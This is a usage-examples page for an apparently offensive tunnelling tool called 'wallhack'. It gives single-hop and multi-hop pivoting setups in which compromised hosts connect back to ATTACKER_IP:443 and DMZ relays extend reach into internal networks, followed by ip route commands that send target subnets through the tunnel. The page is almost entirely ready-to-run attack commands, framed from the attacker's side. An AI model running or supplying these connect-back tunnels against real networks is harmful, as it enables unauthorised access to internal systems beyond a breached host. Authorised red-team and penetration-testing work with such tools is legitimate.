# Usage Examples

From simple point-to-point tunnels to complex multi-hop chains.

{% separator /%}

## Single Hop

The simplest deployment scenario. Establish a direct tunnel between your machine and a single compromised host.

{% steps %}
{% step title="Attacker (Entry)" number=1 %}
Listen for incoming connections on port 443

{% codeblock code="wallhack entry --listen :443" /%}
{% /step %}

{% step title="Compromised Host (Exit)" number=2 %}
Connect back to the attacker

{% codeblock code="./wallhack exit --connect ATTACKER_IP:443" /%}
{% /step %}

{% step title="Configure Routes" number=3 %}
Add routes for target networks through the tunnel interface

```bash
ip route add 10.0.0.0/24 dev tun0
ip route add 10.1.0.0/24 dev tun0
```
{% /step %}
{% /steps %}

{% trafficflow flow="Your machine -> Compromised host -> Target network" label="Traffic Flow:" /%}

{% separator /%}

## Multi-Hop

When deeper targets can't reach you directly, chain through intermediate relays to extend your reach.

{% steps %}
{% step title="Attacker (Entry)" number=1 %}
Listen for the first hop

{% codeblock code="wallhack entry --listen :443" /%}
{% /step %}

{% step title="DMZ Host (Relay)" number=2 %}
Connect upstream, listen downstream

{% codeblock code="./wallhack relay --connect ATTACKER_IP:443 --listen :6565" /%}
{% /step %}

{% step title="Internal Host (Exit)" number=3 %}
Connect to the relay

{% codeblock code="./wallhack exit --connect DMZ_IP:6565" /%}
{% /step %}

{% step title="Configure Routes" number=4 %}
Route all target networks through the tunnel

```bash
ip route add 10.0.0.0/24 dev tun0
ip route add 10.1.0.0/24 dev tun0
ip route add 10.2.0.0/24 dev tun0
```
{% /step %}
{% /steps %}

{% trafficflow flow="Your machine -> DMZ host -> Internal host -> Target (10.2.0.0/24)" label="Traffic Flow:" /%}
